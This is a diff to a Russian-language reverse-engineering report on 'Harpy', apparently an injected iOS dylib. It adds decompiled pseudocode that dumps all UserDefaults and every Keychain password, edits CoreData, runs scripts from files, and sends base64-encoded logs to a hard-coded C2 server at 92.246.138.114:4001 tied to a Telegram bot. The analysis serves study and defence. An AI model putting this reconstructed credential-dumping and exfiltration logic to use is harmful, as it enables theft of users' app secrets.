@@ -147,22 +147,42 @@ void __fastcall sub_4000() {
 }
 ```
 
-### sub_3BEE0 — Start Monitoring Handler
+### AppState_onStartPressed (0x3BEE0) — Start Monitoring Handler
 
 ```c
-// Адрес: 0x3BEE0
+// Адрес: 0x3BEE0 (переименовано: AppState_onStartPressed)
 // Вызывается при нажатии кнопки "Start"
-void sub_3BEE0() {
+void AppState_onStartPressed() {
     // Установка флага isStartPressed = 1
     AppState.isStartPressed = 1;  // OBJC_IVAR____TtC5harpy8AppState_isStartPressed
     
     // Инициализация C2 соединения
-    sub_2D99C(0);  // DispatchQueue accessor
+    DispatchQueue_getMetadata(0);  // Получение метаданных очереди
     
     // Async задача через 2 секунды
     DispatchTime now = DispatchTime.now();
     DispatchTime delay = now + 2.0;
     OS_dispatch_queue.asyncAfter(delay, block);
+}
+```
+
+### StartButton_createView (0x4546C) — UI кнопки "Start"
+
+```c
+// Адрес: 0x4546C (переименовано: StartButton_createView)
+// Создает SwiftUI кнопку запуска
+View StartButton_createView() {
+    Text("Start")                           // LocalizedStringKey: 0x7472617453
+        .font(.title2)                      // Font.TextStyle.title2
+        .fontDesign(.rounded)               // Font.Design.rounded
+        .fontWeight(.semibold)              // Font.Weight.semibold
+        .foregroundColor(.white)            // static Color.white.getter
+        .frame(height: 70)                  // 0x4051800000000000 = 70.0
+        .padding(.horizontal, 25)           // EdgeInsets._all(25.0)
+        .background {
+            RoundedRectangle(cornerRadius: 20)  // FMOV V0.2D, #20.0
+                .fill(Color.black)              // static Color.black.getter
+        }
 }
 ```
 
@@ -190,6 +210,33 @@ v52 = String._bridgeToObjectiveC()(value);
 objc_msgSend(v50, "setObject:forKey:", v51, v52);
 ```
 
+**Harpy_readUserDefaults (0x46654)** — Чтение всех UserDefaults:
+```c
+// Адрес: 0x46654 (переименовано: Harpy_readUserDefaults)
+String Harpy_readUserDefaults() {
+    // Заголовок вывода
+    char output[24] = "UserDefaults:\n";
+    
+    // Получение стандартных UserDefaults
+    NSUserDefaults *defaults = [[NSUserDefaults standardUserDefaults];
+    NSDictionary *dict = [defaults dictionaryRepresentation];
+    
+    // Конвертация в Swift Dictionary
+    Dictionary<String, Any> swiftDict = Dictionary._unconditionallyBridgeFromObjectiveC(dict);
+    
+    // Итерация по всем ключам
+    for (key, value in swiftDict) {
+        // Форматирование: "key: value\n"
+        String.append(key);
+        String.append(": ");
+        _print_unlocked(value);
+        String.append("\n");
+    }
+    
+    return output;  // Полный дамп UserDefaults
+}
+```
+
 #### 🔐 Keychain операции
 
 | Команда | Адрес строки | Regex паттерн |
@@ -198,15 +245,46 @@ objc_msgSend(v50, "setObject:forKey:", v51, v52);
 | `.harpy.remove.keychain` | 0x50a30 | `\.harpy\.remove\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$` |
 | `.harpy.read.keychain` | 0x50a50 | - |
 
-Реализация удаления из Keychain (sub_46C94):
+**Harpy_readKeychain (0x46DC0)** — Чтение всех записей Keychain:
 ```c
-// Формирование query для SecItemDelete
-NSDictionary *query = @{
-    (id)kSecClass: (id)kSecClassGenericPassword,
-    (id)kSecAttrAccount: accountName
-};
-SecItemDelete((CFDictionaryRef)query);
-// Вывод: "Keychain ключ удален: %@"
+// Адрес: 0x46DC0 (переименовано: Harpy_readKeychain)
+String Harpy_readKeychain() {
+    // Формирование query для чтения ВСЕХ паролей
+    NSDictionary *query = @{
+        (id)kSecClass: (id)kSecClassGenericPassword,
+        (id)kSecMatchLimit: (id)kSecMatchLimitAll,
+        (id)kSecReturnAttributes: @YES,
+        (id)kSecReturnData: @YES
+    };
+    
+    CFTypeRef result = nil;
+    OSStatus status = SecItemCopyMatching((CFDictionaryRef)query, &result);
+    
+    if (status == errSecSuccess && result != nil) {
+        // Конвертация CFArray в Swift Array
+        Array<Dictionary> items = dynamicCast(result);
+        
+        // Объединение всех записей через "\n"
+        return BidirectionalCollection.joined(separator: "\n");
+    }
+    
+    return "Keychain read error";  // Код ошибки: 0x1000000000000021
+}
+```
+
+**Harpy_editKeychain (0x46C94)** — Удаление записи из Keychain:
+```c
+// Адрес: 0x46C94 (переименовано: Harpy_editKeychain)
+void Harpy_editKeychain(String accountName) {
+    // Формирование query для удаления
+    NSDictionary *query = @{
+        (id)kSecClass: (id)kSecClassGenericPassword,
+        (id)kSecAttrAccount: accountName
+    };
+    
+    // Удаление записи
+    SecItemDelete((CFDictionaryRef)query);
+}
 ```
 
 #### 💾 CoreData операции
@@ -216,13 +294,84 @@ SecItemDelete((CFDictionaryRef)query);
 | `.harpy.update.coredata` | 0x50a70 | Модификация записей |
 | `.harpy.read.app` | - | Чтение данных приложения |
 
-Реализация (sub_47130):
+**Harpy_updateCoreData (0x47130)** — Модификация CoreData:
 ```c
-// Использует NSPredicate для фильтрации
-NSPredicate *predicate = [NSPredicate predicateWithFormat:format];
-NSFetchRequest *request = [[NSFetchRequest alloc] init];
-[request setPredicate:predicate];
+// Адрес: 0x47130 (переименовано: Harpy_updateCoreData)
+void Harpy_updateCoreData(script_data) {
+    // Парсинг параметров скрипта
+    // Паттерн: 0xD000000000000016 = ".harpy.update.coredata"
+    
+    // 1. Извлечение entity name
+    String entityName = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
+    
+    // 2. Извлечение predicate format
+    String predicateFormat = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
+    
+    // 3. Извлечение нового значения
+    String newValue = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
+    
+    // 4. Создание NSPredicate
+    NSPredicate *predicate = [NSPredicate predicateWithFormat:predicateFormat];
+    
+    // 5. Создание fetch request
+    NSFetchRequest *request = [[NSFetchRequest alloc] init];
+    [request setPredicate:predicate];
+    
+    // 6. Обновление данных
+    // ... модификация записей CoreData
+}
 ```
+
+#### 🖨️ Системные команды
+
+| Команда | Адрес строки | Regex паттерн |
+|---------|--------------|---------------|
+| `.harpy.print(message:` | 0x50ad0 | Вывод в лог |
+| `.harpy.execute(script:` | 0x50af0 | Рекурсивное выполнение |
+| `.harpy.write.file` | 0x50ab0 | Запись в файл |
+| `.harpy.update.server` | 0x50a90 | Обновление с сервера |
+| `.harpy(sleep:` | - | Пауза (regex: `sleep:\s*(\d+)`) |
+| `harpy(start)` | - | Маркер начала скрипта |
+| `.modifyrestart` | - | Флаг перезапуска |
+
+**Harpy_executeScript (0x490C8)** — Выполнение скрипта из файла:
+```c
+// Адрес: 0x490C8 (переименовано: Harpy_executeScript)
+void Harpy_executeScript(URL baseURL, String scriptName) {
+    // 1. Получение метаданных HarpyScript
+    type_metadata_accessor_for_HarpyScript(0);
+    
+    // 2. Формирование полного пути
+    URL scriptURL = URL.appendingPathComponent(baseURL, scriptName);
+    
+    // 3. Чтение содержимого файла в UTF-8
+    String scriptContent = String.init(contentsOf: scriptURL, encoding: .utf8);
+    
+    // 4. Рекурсивный вызов парсера
+    HarpyScript_executeCommands(scriptContent);
+}
+```
+
+**Harpy_createRegex (0x4AA48)** — Создание регулярного выражения:
+```c
+// Адрес: 0x4AA48 (переименовано: Harpy_createRegex)
+NSRegularExpression* Harpy_createRegex(String pattern, options) {
+    NSError *error = nil;
+    
+    // Создание NSRegularExpression
+    NSRegularExpression *regex = [[NSRegularExpression alloc] 
+        initWithPattern:pattern 
+        options:options 
+        error:&error];
+    
+    if (regex == nil) {
+        // Конвертация NSError в Swift Error
+        _convertNSErrorToError(error);
+        swift_willThrow();
+    }
+    
+    return regex;
+}
 
 #### 🖨️ Системные команды
 
@@ -351,12 +500,19 @@ __int64 sub_48464(__int64 script, __int64 key_pattern, __int64 value_pattern) {
 | **Протокол** | TCP (Network.framework) |
 | **API** | NWConnection |
 
-### Реализация C2 соединения (sub_2A2EC)
+### HarpyNetwork_connectToServer (0x2A2EC) — C2 соединение
 
 ```c
-void sub_2A2EC() {
+// Адрес: 0x2A2EC (переименовано: HarpyNetwork_connectToServer)
+void HarpyNetwork_connectToServer() {
     // 1. Создание endpoint
+    // IP формируется из констант:
+    // 0x312E3634322E3239 = "29.246.1" (little-endian)
+    // 0x003431312E383339 = "38.114" (little-endian)
+    // Итого: "92.246.138.114"
     NWEndpoint.Host host = NWEndpoint.Host.init(stringLiteral:)("92.246.138.114");
+    
+    // Порт: 0xFA1 = 4001
     NWEndpoint.Port port = NWEndpoint.Port.init(integerLiteral:)(4001);
     
     // 2. Получение TCP параметров
@@ -366,17 +522,99 @@ void sub_2A2EC() {
     NWConnection *connection = NWConnection.__allocating_init(host:port:using:)(
         host, port, params);
     
-    // 4. Установка обработчика состояния
-    NWConnection.stateUpdateHandler.setter(connection, ^(NWConnectionState state) {
-        // Обработка изменений состояния
-    });
+    // 4. Установка обработчика состояния -> sub_2D984
+    NWConnection.stateUpdateHandler.setter(connection, sub_2D984);
     
-    // 5. Запуск соединения
-    DispatchQueue *queue = DispatchQueue.init(
-        label: "harpy.network",
-        qos: DispatchQoS.QoSClass.default
+    // 5. Запуск на global queue с default QoS
+    NWConnection.start(queue:)(connection, globalQueue);
+}
+```
+
+### HarpyNetwork_onStateChange (0x2AA6C) — Обработчик состояния
+
+```c
+// Адрес: 0x2AA6C (переименовано: HarpyNetwork_onStateChange)
+void HarpyNetwork_onStateChange(NWConnectionState state) {
+    // Проверка состояния соединения
+    if (state == NWConnection.State.failed) {
+        // Переподключение через 2 секунды на main queue
+        dispatch_async_after(main_queue, 2.0, ^{
+            // Повторная попытка подключения
+        });
+    }
+    else if (state == NWConnection.State.ready) {
+        // Соединение установлено - отправка данных
+        HarpyNetwork_onConnectionReady(context);  // sub_2AE40
+    }
+}
+```
+
+### HarpyNetwork_onConnectionReady (0x2AE40) — Отправка данных
+
+```c
+// Адрес: 0x2AE40 (переименовано: HarpyNetwork_onConnectionReady)
+void HarpyNetwork_onConnectionReady(context) {
+    // 1. Получение данных логгера через KeyPath
+    KeyPath loggerPath = swift_getKeyPath(&unk_4FBB0);
+    KeyPath dataPath = swift_getKeyPath(&unk_4FBD8);
+    
+    // 2. Чтение Published свойства
+    static Published.subscript.getter(&data, loggerPath, dataPath);
+    
+    // 3. Конвертация в UTF-8 Data
+    Data utf8Data = StringProtocol.data(using: .utf8, allowLossyConversion: false);
+    
+    // 4. Base64 кодирование
+    String base64String = Data.base64EncodedString(options: []);
+    
+    // 5. Формирование JSON payload
+    struct TelegramPayload {
+        String telegramId;    // "telegramId" = 0x6D617267656C6574 + 0xEA00000000006449
+        String data;          // base64 encoded data
+        String action;        // "action" = 0x6E6F69746361
+        String status;        // "enable" (0x656C62616E65) или "disable" (0x656C6261736964)
+    };
+    
+    // 6. Кодирование в JSON
+    JSONEncoder *encoder = JSONEncoder.init();
+    Data jsonData = JSONEncoder.encode(payload);
+    
+    // 7. Отправка через NWConnection
+    NWConnection.send(
+        content: jsonData,
+        contentContext: NWConnection.ContentContext.defaultMessage,
+        isComplete: true,
+        completion: .contentProcessed(HarpyNetwork_sendComplete)
     );
-    NWConnection.start(queue:)(connection, queue);
+}
+```
+
+### HarpyNetwork_receiveData (0x2BB6C) — Прием данных
+
+```c
+// Адрес: 0x2BB6C (переименовано: HarpyNetwork_receiveData)
+void HarpyNetwork_receiveData(data, context, isComplete, error) {
+    if (error == nil) {
+        // Парсинг JSON ответа
+        JSONDecoder *decoder = JSONDecoder.init();
+        ResponsePayload response = JSONDecoder.decode(from: data);
+        
+        // Проверка на ошибку ("error" в ответе)
+        if (swift_bridgeObjectRetain(response) && 
+            sub_DB3C("error", 0xE500000000000000) != 0) {
+            // Обработка ошибки
+            dispatch_async(main_queue, ^{ /* ... */ });
+        }
+        else {
+            // Обработка успешного ответа
+            // Продолжение приема данных
+            NWConnection.receive(
+                minimumIncompleteLength: 1,
+                maximumLength: 1024,
+                completion: HarpyNetwork_receiveData
+            );
+        }
+    }
 }
 ```
 
@@ -385,15 +623,21 @@ void sub_2A2EC() {
 Адрес type metadata: `0x69700`
 
 ```c
-// Отправка логов через Telegram Bot API
+// Логирование и отправка через Telegram Bot API
 // Bot: @harpyapp_bot (https://t.me/harpyapp_bot)
 
 struct HarpyLogger {
-    String telegramBotToken;
+    String telegramBotToken;      // _telegramId (0x68950)
     String chatId;
     Bool isEnabled;
     NWConnection *c2Connection;
+    Published<String> logData;    // @Published данные для отправки
 };
+
+// Strings:
+// - "Data logging in telegram bot" (0x506c0)
+// - "Your Telegram ID" (0x50700)
+// - "_telegramId" / "_telegramID" (0x50804, 0x6105f, 0x61260)
 ```
 
 ### Внешние URL
@@ -402,8 +646,8 @@ struct HarpyLogger {
 |-----|------------|--------------|
 | `https://i.ibb.co/SKYxFp1/logos.png` | Логотип приложения | 0x50700 |
 | `https://t.me/harpysupport` | Поддержка | 0x506xx |
-| `https://t.me/harpyapp_bot` | Telegram бот | 0x506xx |
-| `https://t.me/harpyapp` | Канал Harpy | 0x506xx |
+| `https://t.me/harpyapp_bot` | Telegram бот | 0x506E0 |
+| `https://t.me/harpyapp` | Канал Harpy | 0x50790 |
 | `https://t.me/lurizevl` | Разработчик | 0x506xx |
 | `https://t.me/imharpy` | Профиль | 0x506xx |
 
@@ -469,85 +713,91 @@ Button {
 | sub_43F0 | ContentView.body | ConditionalContent |
 | sub_5198 | VStack builder | VStack with spacing |
 | sub_3C768 | Rounded rectangle | RoundedRectangle, StrokeStyle |
-| sub_4546C | Start button | Button, Text, Font |
+| StartButton_createView (0x4546C) | Start button | Button, Text, Font |
 | sub_3D4F4 | NavigationView | NavigationView, sheet |
 | sub_2FA88 | HarpySettings | Image from URL, EdgeInsets |
 
 ---
 
-## 🗺️ Полная функциональная карта
+## 🗺️ Полная функциональная карта (с переименованными функциями)
 
 ### Инициализация и Lifecycle
 
-| Адрес | Функция | Сигнатура | Описание |
+| Адрес | Функция | Новое имя | Описание |
 |-------|---------|-----------|----------|
-| 0x4000 | Entry Point | `void sub_4000()` | Инициализация dylib |
-| 0xB77C | AppState.shared | `+[AppState shared]` | Singleton accessor |
-| 0x105F0 | Present UI | `+[SwiftUIWrapper presentContentView]` | Показ UI через 1с |
-| 0xC774 | Dismiss UI | `+[SwiftUIWrapper dismissContentView]` | Закрытие UI |
-| 0x3BEE0 | Start Handler | `void sub_3BEE0()` | Обработчик Start |
-| 0x2D99C | Queue Accessor | `void sub_2D99C()` | DispatchQueue init |
+| 0x4000 | Entry Point | - | Инициализация dylib |
+| 0xB77C | AppState.shared | - | Singleton accessor |
+| 0x105F0 | Present UI | - | Показ UI через 1с |
+| 0xC774 | Dismiss UI | - | Закрытие UI |
+| 0x3BEE0 | sub_3BEE0 | **AppState_onStartPressed** | Обработчик Start |
+| 0x2D99C | sub_2D99C | **DispatchQueue_getMetadata** | DispatchQueue init |
 
 ### Парсер скриптов
 
-| Адрес | Функция | Размер | Описание |
-|-------|---------|--------|----------|
-| 0x42B54 | Script Parser | ~1883 строк | Главный парсер DSL |
-| 0x48464 | Param Parser | ~300 строк | Извлечение параметров |
-| 0x490C8 | Script Loader | ~100 строк | Загрузка из файла |
-| 0x49528 | Script Saver | ~200 строк | Сохранение конфига |
-| 0x4AA48 | Regex Factory | ~50 строк | Создание NSRegularExpression |
+| Адрес | Функция | Новое имя | Описание |
+|-------|---------|-----------|----------|
+| 0x42B54 | sub_42B54 | **HarpyScript_executeCommands** | Главный парсер DSL (~1883 строк) |
+| 0x48464 | sub_48464 | **Harpy_parseScriptCommand** | Извлечение параметров |
+| 0x490C8 | sub_490C8 | **Harpy_executeScript** | Загрузка из файла |
+| 0x47CFC | sub_47CFC | **Harpy_writeFile** | Запись в файл |
+| 0x4AA48 | sub_4AA48 | **Harpy_createRegex** | Создание NSRegularExpression |
 
 ### UserDefaults операции
 
-| Адрес | Функция | Операция |
-|-------|---------|----------|
-| 0x46654 | Read UD | Чтение dictionaryRepresentation |
-| 0x432C8 | Set UD | setObject:forKey: |
-| 0x44734 | Remove UD | removeObjectForKey: |
-| 0x43290 | Edit UD | Парсинг + установка |
+| Адрес | Функция | Новое имя | Операция |
+|-------|---------|-----------|----------|
+| 0x46654 | sub_46654 | **Harpy_readUserDefaults** | Чтение dictionaryRepresentation |
+| 0x432C8 | sub_432C8 | - | setObject:forKey: |
+| 0x44734 | sub_44734 | - | removeObjectForKey: |
+| 0x43290 | sub_43290 | - | Парсинг + установка |
 
 ### Keychain операции
 
-| Адрес | Функция | Операция |
-|-------|---------|----------|
-| 0x46C94 | Remove Key | SecItemDelete |
-| 0x44680 | Read Key | SecItemCopyMatching |
-| 0x440C4 | Edit Key | SecItemUpdate |
+| Адрес | Функция | Новое имя | Операция |
+|-------|---------|-----------|----------|
+| 0x46DC0 | sub_46DC0 | **Harpy_readKeychain** | SecItemCopyMatching (ALL) |
+| 0x46C94 | sub_46C94 | **Harpy_editKeychain** | SecItemDelete |
+| 0x44680 | sub_44680 | - | SecItemCopyMatching |
+| 0x440C4 | sub_440C4 | - | SecItemUpdate |
 
 ### CoreData операции
 
-| Адрес | Функция | Операция |
-|-------|---------|----------|
-| 0x47130 | Update CD | NSPredicate + NSFetchRequest |
-| 0x48C0C | Read App | Чтение директории |
+| Адрес | Функция | Новое имя | Операция |
+|-------|---------|-----------|----------|
+| 0x47130 | sub_47130 | **Harpy_updateCoreData** | NSPredicate + NSFetchRequest |
+| 0x48C0C | sub_48C0C | - | Чтение директории |
 
-### Сетевые функции
+### Сетевые функции (C2)
 
-| Адрес | Функция | Описание |
-|-------|---------|----------|
-| 0x2A2EC | C2 Connect | TCP 92.246.138.114:4001 |
-| 0x2D8BC | Send Log | Отправка через HarpyLogger |
-| 0xD8E0 | URL Load | NSData initWithContentsOfURL |
+| Адрес | Функция | Новое имя | Описание |
+|-------|---------|-----------|----------|
+| 0x2A2EC | sub_2A2EC | **HarpyNetwork_connectToServer** | TCP 92.246.138.114:4001 |
+| 0x2AA6C | sub_2AA6C | **HarpyNetwork_onStateChange** | Обработчик состояния NWConnection |
+| 0x2AE40 | sub_2AE40 | **HarpyNetwork_onConnectionReady** | Отправка данных при подключении |
+| 0x2B710 | sub_2B710 | **HarpyNetwork_sendComplete** | Callback после отправки |
+| 0x2BB6C | sub_2BB6C | **HarpyNetwork_receiveData** | Прием данных от C2 |
+| 0x2DC1C | sub_2DC1C | **HarpyLogger_wrapCallback** | Обертка для логгера |
+| 0xD8E0 | sub_D8E0 | - | NSData initWithContentsOfURL |
 
 ### UI функции
 
-| Адрес | Функция | View |
-|-------|---------|------|
-| 0x363B8 | HarpyView.body | Главный экран |
-| 0x43F0 | ContentView.body | Root view |
-| 0x2FA88 | HarpySettings | Настройки |
-| 0x3D4F4 | NavigationView | Навигация |
-| 0x45AA4 | File List | Список .txt файлов |
+| Адрес | Функция | Новое имя | View |
+|-------|---------|-----------|------|
+| 0x363B8 | sub_363B8 | - | HarpyView.body - Главный экран |
+| 0x43F0 | sub_43F0 | - | ContentView.body - Root view |
+| 0x4546C | sub_4546C | **StartButton_createView** | Кнопка Start |
+| 0x2FA88 | sub_2FA88 | - | HarpySettings - Настройки |
+| 0x3D4F4 | sub_3D4F4 | - | NavigationView - Навигация |
+| 0x45AA4 | sub_45AA4 | - | File List - Список .txt файлов |
 
 ### Вспомогательные
 
 | Адрес | Функция | Описание |
 |-------|---------|----------|
-| 0x4BBB8 | State Release | Освобождение State |
-| 0x4BA88 | State Access | Доступ к State |
-| 0xCF20 | Metadata Get | Type metadata accessor |
-| 0xCF64 | Conformance | Protocol conformance |
+| 0x4BBB8 | sub_4BBB8 | Освобождение State |
+| 0x4BA88 | sub_4BA88 | Доступ к State |
+| 0xCF20 | sub_CF20 | Type metadata accessor |
+| 0xCF64 | sub_CF64 | Protocol conformance |
 
 ---
 
